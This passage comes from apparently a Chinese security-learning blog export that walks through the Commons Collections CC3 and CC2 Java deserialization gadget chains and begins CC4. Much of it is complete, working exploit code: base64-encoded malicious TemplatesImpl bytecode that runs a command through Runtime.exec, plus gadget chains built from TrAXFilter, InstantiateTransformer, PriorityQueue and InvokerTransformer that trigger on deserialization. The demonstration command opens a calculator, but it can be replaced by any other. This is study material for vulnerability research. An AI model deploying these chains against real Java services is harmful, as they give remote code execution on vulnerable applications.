5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");

            //反射设置 Field
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{code});
            setFieldValue(templates, "_name", "HelloTemplatesImpl");
            setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

            //Transformer数组
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
            };

            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

            //LazyMap实例
            Map uselessMap = new HashMap();
            Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

            //反射获取AnnotationInvocationHandler实例
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

            //动态代理类，为了触发 AnnotationInvocationHandler#invoke
            Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

            InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);


            //序列化
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(handler1);
            oos.flush();
            oos.close();

            //测试反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    //反射设置 Field
    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}

```
## 分析
在demo中，Transformer数组对象的组成是ConstantTransformer+InstantiateTransformer，和CC1-2相比，变了的是将InvokerTransformer换成了InstantiateTransformer

![](https://s3.hedgedoc.org/demo/uploads/6c6ffe28-360f-4934-9d1d-e21f420961fa.png)

我们跟进InstantiateTransformer.transform()方法

![](https://s3.hedgedoc.org/demo/uploads/2c721a72-c158-4aea-9ad8-b7bed57b6a7f.png)

它的作用是获取传入对象input，然后通过反射获取构造方法，最后通过newInstance()方法实例化input对象并输出

其中需要构造方法的参数类型（iParamTypes）和实例化需要的参数对象（iArgs）

而iParamTypes和iArgs都是在InstantiateTransformer实例化的时候传入

![](https://s3.hedgedoc.org/demo/uploads/03e28a3d-9355-4af3-8d23-e19b3df4ecad.png)

demo这里是传入的一个Templates对象

![](https://s3.hedgedoc.org/demo/uploads/693556b7-b8ff-4014-8142-510bda3b1cde.png)

经过前面的CC1链分析，我们知道会调用Transformer数组对象中元素的transform()方法，并且前一个元素transform()方法的值，是后一个元素transform()方法的参数

也就是说InstantiateTransformer.transform()的传入的值是TrAXFilter.class

![](https://s3.hedgedoc.org/demo/uploads/f06d2cce-28aa-43d4-99d3-cc41f426711e.png)

所以demo中Transformer数组对象其实就是一个TrAXFilter对象

继续看Transformer数组前的代码

![](https://s3.hedgedoc.org/demo/uploads/79ce0f17-22c5-433c-874f-961765c6de3c.png)

new了一个TemplatesImpl对象，并给_bytecodes、_name、_tfactory三个成员变量赋值，我们把code的代码给解码然后反编译

![](https://s3.hedgedoc.org/demo/uploads/8ce91908-c322-43ff-af0f-c4d3b3af8c30.png)

其实就是一个自定义的类，不过继承了AbstractTranslet并在构造函数中执行了弹出计算器的命令，也就是说实例化这个自定义类的时候，就会触发命令弹出计算器的命令

但是这个自定义类通过TemplatesImpl类动态加载为对象（tmplates）并封装到了TrAXFilter对象中

![](https://s3.hedgedoc.org/demo/uploads/a97ab2e8-23c0-40f5-8bcd-a657bbbbc9b0.png)

为啥要将TemplatesImpl类封装到TrAXFilter对象中，我们跟进到TrAXFilter类

![](https://s3.hedgedoc.org/demo/uploads/c207a31d-cd7b-4571-853f-d38f1ca0c42f.png)

可以看到，在构造方法中，只要TrAXFilter类一实例化，就会调用_transformer = (TransformerImpl) templates.newTransformer()，而templates是一个Templates实例对象，而TemplatesImpl类实现了Templates接口，所以调用templates.newTransformer()就会实例化自定义类，执行命令，弹出计算器

然后后面的代码，就是正常的cc1-2链中的内容

![](https://s3.hedgedoc.org/demo/uploads/53db633d-2eef-44b3-b517-a12330ff72c6.png)

## 完整代码
```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import com.sun.org.apache.xml.internal.security.utils.Base64;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3 {

    //用于反射调用成员变量并赋值
    public static void setValue(Object object, String name, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(name);
            field.setAccessible(true);
            field.set(object,value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception{
        byte[] code = Base64.decode("yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name","test111");
        setValue(templates,"_bytecodes", new byte[][]{code});
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //反射获取AnnotationInvocationHandler实例
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        //动态代理类，设置一个D代理对象，为了触发 AnnotationInvocationHandler#invoke
        Map mapProxy = (Map) Proxy.newProxyInstance(
                LazyMap.class.getClassLoader(),
                LazyMap.class.getInterfaces(),
                handler);

        InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
        System.out.println(11);
        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\2200.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(handler1);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\2200.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
## 学习
https://xz.aliyun.com/t/9409
















]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>4、CC2</title>
    <url>/2023/08/25/4%E3%80%81CC2/</url>
    <content><![CDATA[# CC2
## 前置知识
{% post_link TemplatesImpl %}
## 利用版本
jdk8（这里用的jdk8u201）&& Commons-Collections 4-4.0（只有4.0能用）
## CC Demo
```
package Apache_Common_Collections.cc_1_7;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections2 {

    public static void main(String[] args) {

        try{
            //字节码
            byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");

            //反射设置 Field
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{code});
            setFieldValue(templates, "_name", "HelloTemplatesImpl");
            setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());

            //为了执行 templates.newTransformer
            InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

            //TransformingComparator 实例
            TransformingComparator comparator = new TransformingComparator(invokerTransformer);

            //PriorityQueue 实例
            PriorityQueue priorityQueue = new PriorityQueue(2);
            //先设置为正常变量值，后面可以通过setFieldValue修改
            priorityQueue.add(1);
            priorityQueue.add(1);

            //反射设置 Field
            Object[] objects = new Object[]{templates, templates};
            setFieldValue(priorityQueue, "queue", objects);
            setFieldValue(priorityQueue, "comparator", comparator);

            //序列化
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(priorityQueue);
            oos.flush();
            oos.close();

            //测试反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    //反射设置 Field
    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}

```
## 分析
demo从下往上分析，序列化的是一个PriorityQueue对象，我们跟进PriorityQueue类

![](https://s3.hedgedoc.org/demo/uploads/3612406a-6efd-45c0-b88c-0c6f3e54f833.png)

它实现了Serializable接口，并重写了readObject方法

![](https://s3.hedgedoc.org/demo/uploads/2a6193e7-c04e-4be6-8659-b682aac37a6b.png)

![](https://s3.hedgedoc.org/demo/uploads/ffda2ca1-5c6c-4b9a-847d-faec9366bff2.png)

我们跟进heapify()方法

![](https://s3.hedgedoc.org/demo/uploads/7d831cfb-5544-43d5-9cda-3601c61da3c1.png)

继续跟进siftDown()方法

![](https://s3.hedgedoc.org/demo/uploads/ec7aa726-6288-4e67-90ad-265a2bf491f6.png)

继续跟进siftDownUsingComparator方法

![](https://s3.hedgedoc.org/demo/uploads/e0487b69-45e7-4b66-8716-6516f03ffcb5.png)

好了，这里会调用了成员变量comparator的compare()方法，而成员变量comparator其实就是Comparator对象，所以在反序列化PriorityQueue对象的时候，一定会调用Comparator.compare()方法

我们回到demo

![](https://s3.hedgedoc.org/demo/uploads/7f48b973-8f43-4107-833b-165afa898774.png)

demo中，给PriorityQueue对象的成员变量comparator传入的就是TransformingComparator对象，我们跟进TransformingComparator对象

![](https://s3.hedgedoc.org/demo/uploads/b1242b5c-2e40-4f5f-9957-caa1105ce3ae.png)

它实现了Comparator，说明TransformingComparator对象也是Comparator对象，且它的compare()方法中，传入了两个对象，并分别调用了transformer.transform()方法

上面说到，在反序列化PriorityQueue对象的时候，一定会调用Comparator.compare()方法，而现在PriorityQueue对象中成员变量comparator是TransformingComparator对象，所以一定会调用TransformingComparator对象的compare()方法中的transformer.transform()方法

![](https://s3.hedgedoc.org/demo/uploads/09de6585-c234-46a8-a51e-af41406ea739.png)

此时，transformer就是InvokerTransformer对象，因为demo中，InvokerTransformer对象封装到了TransformingComparator对象里面

![](https://s3.hedgedoc.org/demo/uploads/be54e29d-ce4f-45f1-89e6-2553465c3f31.png)

而InvokerTransformer.transformer()方法传入的Object对象其实来自于PriorityQueue的成员变量queue中

![](https://s3.hedgedoc.org/demo/uploads/323f5104-4607-4936-a755-e08d041f2470.png)

从demo中可以看到，将TemplatesImpl对象先封装到Object数组对象中，然后再将Object数组对象赋值给PriorityQueue的成员变量queue

所以此时的queue的元素是TemplatesImpl对象，即InvokerTransformer.transformer()方法传入的Object对象就是TemplatesImpl对象

![](https://s3.hedgedoc.org/demo/uploads/08139a42-9f04-4c7a-b139-569c49f984b4.png)

而InvokerTransformer.transformer()方法的作用就是调用传如对象的指定方法，需要传入类、指定方法名，指定参数类型、指定参数

![](https://s3.hedgedoc.org/demo/uploads/6282124a-7097-4ac4-962c-4d209240feaa.png)

而指定方法名，指定参数类型、指定参数，在InvokerTransformer的构造函数中赋值，即在实例化InvokerTransformer对象的时候赋值

![](https://s3.hedgedoc.org/demo/uploads/39b14f67-40b4-4bc3-aa0a-e94121c1bd51.png)

这里传入的的方法是newTransformer，而参数类型和参数为空，即调用TemplatesImpl.newTransformer()方法，成功实例化TemplatesImpl对像

然后，在实例化TemplatesImpl的时候，就会触发弹出计算器的命令

完成
## 完整代码
```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.utils.Base64;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections2 {

    //用于反射调用成员变量并赋值
    public static void setValue(Object object, String fieldName, Object fieldValue) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object,fieldValue);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception{
        byte[] code = Base64.decode("yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name","test111");
        setValue(templates,"_bytecodes", new byte[][]{code});
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

        //获取newTransformer方法
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer",null, null);

        //TransformingComparator实例，并将InvokerTransformer封装进去
        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);

        //获取PriorityQueue实例
        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add(1);
        priorityQueue.add(2);

        //PriorityQueue实例的成员变量赋值
        Object[] objects = new Object[]{templates,templates};
        setValue(priorityQueue,"queue",objects);
        setValue(priorityQueue,"comparator",transformingComparator);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aaa.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(priorityQueue);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aaa.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
效果:

![](https://s3.hedgedoc.org/demo/uploads/ee886726-2775-4f47-aebd-4df5fc691e02.png)

报错，到是不影响我弹计算器

## 学习
https://xz.aliyun.com/t/9409




































]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>5、CC4</title>
    <url>/2023/08/25/5%E3%80%81CC4/</url>
    <content><![CDATA[# CC4
## 利用版本
jdk8（这里用的jdk8u201） &&  Commons-Collections 4所有版本
## CC4 Demo
```
package Apache_Common_Collections.cc_1_7;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

//与cc2类似
//InvokeTransformer 变为 InstantiateTransformer
public class CommonsCollections4 {

    public static void main(String[] args) {

        try{
            //字节码
